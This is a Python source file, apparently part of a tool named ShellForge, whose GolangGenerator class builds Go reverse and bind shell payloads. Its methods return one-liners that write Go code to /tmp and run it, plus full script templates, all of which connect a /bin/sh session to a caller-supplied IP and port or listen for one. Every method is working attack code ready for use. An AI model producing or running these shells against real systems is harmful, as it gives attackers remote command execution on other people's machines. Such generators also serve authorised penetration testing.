"""
Go (Golang) reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class GolangGenerator(PayloadGenerator):
    """Standard Go net reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"echo 'package main;import\"os/exec\";import\"net\";"
            f'func main(){{c,_:=net.Dial("tcp","{ip}:{port}");'
            f'cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;'
            f"cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go"
        )

    def bind(self, port: int) -> str:
        return (
            f"echo 'package main;import\"os/exec\";import\"net\";"
            f'func main(){{l,_:=net.Listen("tcp",":{port}");'
            f"c,_:=l.Accept();cmd:=exec.Command(\"/bin/sh\");"
            f"cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' "
            f"> /tmp/t.go && go run /tmp/t.go"
        )

    def file_extension(self) -> str:
        return ".go"

    def reverse_script(self, ip: str, port: int) -> str:
        return f"""// ShellForge Go Reverse Shell
// Author: Mostafa Tamime
// Run: go run reverse.go
// Target: {ip}:{port}

package main

import (
\t"net"
\t"os/exec"
)

func main() {{
\tc, _ := net.Dial("tcp", "{ip}:{port}")
\tcmd := exec.Command("/bin/sh")
\tcmd.Stdin = c
\tcmd.Stdout = c
\tcmd.Stderr = c
\tcmd.Run()
}}
"""

    def bind_script(self, port: int) -> str:
        return f"""// ShellForge Go Bind Shell
// Author: Mostafa Tamime
// Run: go run bind.go
// Port: {port}

package main

import (
\t"net"
\t"os/exec"
)

func main() {{
\tl, _ := net.Listen("tcp", ":{port}")
\tc, _ := l.Accept()
\tcmd := exec.Command("/bin/sh")
\tcmd.Stdin = c
\tcmd.Stdout = c
\tcmd.Stderr = c
\tcmd.Run()
}}
"""
